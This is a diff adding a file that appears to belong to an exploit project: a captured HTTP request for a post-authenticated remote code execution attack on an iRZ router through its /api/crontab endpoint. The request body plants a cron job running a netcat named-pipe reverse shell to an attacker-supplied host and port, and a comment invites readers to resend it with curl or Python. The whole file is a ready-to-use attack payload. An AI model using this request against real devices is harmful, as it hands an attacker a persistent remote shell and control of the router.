@@ -1,0 +1,18 @@
+// This is the burp request for the Post-Authenticated RCE workflow, this will not stay in the final exploit, this is just so you can see
+which headers and values need to change for the request. Feel free to send it as a curl, or use the Python http.requests module or whatever else.
+
+POST /api/crontab HTTP/1.1
+Host: {router_ip}:{router_port}
+Content-Length: 270
+Authorization: Basic {base_64_credentials}
+Accept: application/json, text/javascript
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+Content-Type: application/json
+Origin: http://{router_ip}:{router_port}
+Referer: http://{router_ip}:{router_port}
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+{"tasks":[{"enable":true,"minutes":"*","hours":"*","days":"*","months":"*","weekdays":"*","command":"rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost_ip} {lhost_port} >/tmp/f"}],"_board":{"name":"RL21","platform":"irz_mt02","time":"Wed Mar 16 16:43:20 UTC 2022"}}
